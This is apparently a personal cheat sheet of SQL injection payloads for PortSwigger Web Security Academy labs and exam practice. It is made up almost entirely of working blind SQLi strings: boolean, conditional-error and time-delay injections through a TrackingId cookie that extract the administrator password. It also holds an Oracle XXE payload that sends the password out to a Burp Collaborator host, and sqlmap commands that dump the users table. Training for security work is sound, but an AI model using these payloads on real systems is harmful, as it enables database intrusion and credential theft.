Blind SQL

TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a (This will allow you to verify if there is an existing table users

TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a

This will allow you to verify if administrator is existing or other users

TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a

This will allow you to discover the lenght of the password you want to find

TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a

This query you could use it in the burp intruder section and use the cluster bomb to fill the two payloads 

Burp Intruder / Cluster Bomb
----------------------------------------------------------------------------------------


Blind SQL conditional error

TrackingId=qdc4zTxTf4JsJ7Xr' ||(SELECT '' FROM users WHERE ROWNUM = 1)||'

WHERE ROWNUM = 1 helps us to prevent the concatenation because it allow just one row

TO verify the conditional error use 

Cookie: TrackingId=qdc4zTxTf4JsJ7Xr' ||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ' ' END FROM dual)||'; (Error)

Cookie: TrackingId=qdc4zTxTf4JsJ7Xr' ||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE ' ' END FROM dual)||'; (No error)

If the query exist will return an error if not it will return the normal page without error

Cookie: TrackingId=qdc4zTxTf4JsJ7Xr' ||(SELECT CASE WHEN LENGTH(password)>20 THEN TO_CHAR(1/0) ELSE ' ' END FROM users WHERE username='administrator')||';
Cookie: TrackingId=qdc4zTxTf4JsJ7Xr' ||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ' ' END FROM users WHERE username='administrator')||'; 

To verify if the password is much longer than 20 characters (if not, the error persist)

Final Sample
Cookie: TrackingId=I4NKwCxmsqWtTKVz'UNION 	SELECT CASE WHEN SUBSTR(password,ยง1ยง,1)='ยงaยง' THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator'--; 

TIME DELAY INFORMATION RETRIVAL

%3B = ;

TrackingId=0Ba7ypaGtaQgRN6o'%3B SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--;

TrackingId=0Ba7ypaGtaQgRN6o'%3B SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--;

Cookie: TrackingId=0Ba7ypaGtaQgRN6o'%3B SELECT CASE WHEN (username='administrator' AND SUBSTR(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--;

in case of timing set concurrent requests to 1

TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--

If you want to exfiltrate datas

TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--


TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--

The password will apper in the subdomain of the request

If you find a field to exploit you can try with sql-map:

(1)
python sqlmap.py -u "https://<CHANGE_HERE>.web-security-academy.net/advancedsearch?find=test&organize_by=*&writer=" --cookie="_lab=<CHANGE_HERE>;session=<CHANGE_HERE>" --batch

(2) - Get Databases
python sqlmap.py -u "https://<CHANGE_HERE>.web-security-academy.net/advancedsearch?find=test&organize_by=*&writer=" --cookie="_lab=<CHANGE_HERE>;session=<CHANGE_HERE>" --dbs --batch

(3) - Get Tables
python sqlmap.py -u "https://<CHANGE_HERE>.web-security-academy.net/advancedsearch?find=test&organize_by=*&writer=" --cookie="_lab=<CHANGE_HERE>;session=<CHANGE_HERE>" -D public --tables --batch

(4) - Dump Specific Table
python sqlmap.py -u "https://<CHANGE_HERE>.web-security-academy.net/advancedsearch?find=test&organize_by=*&writer=" --cookie="_lab=<CHANGE_HERE>;session=<CHANGE_HERE>" -D public -T users --dump --batch

Sometimes work, sometimes not, you can try meanwhile manual SQLi


Other samples with sqlMap (to velocize when it's possible the stages in the exam):

--batch (will set all the default option)
--dump (will Dump DBMS database table entries )

Here the injection it's in the cookie:
THIS WILL RETRIVE THE TABLES
python3.9 sqlmap.py -u "https://0a35006a04c116cec0d6690d00ec00b2.web-security-academy.net/filter?category=Pets" --cookie="TrackingId=rPCbIvsmAYOBn0Wi*; session=WuxknuiWqniE8VFoSyQkFo1tuDSJDoEJ" -p 'TrackingId' -D public --tables --batch

ONCE YOU HAVE THE TABLE YOU CAN TRY FOR THE USERS

python3.9 sqlmap.py -u "https://0a35006a04c116cec0d6690d00ec00b2.web-security-academy.net/filter?category=Pets" --cookie="TrackingId=rPCbIvsmAYOBn0Wi*; session=WuxknuiWqniE8VFoSyQkFo1tuDSJDoEJ" -p 'TrackingId' -D public -T users --dump --batch



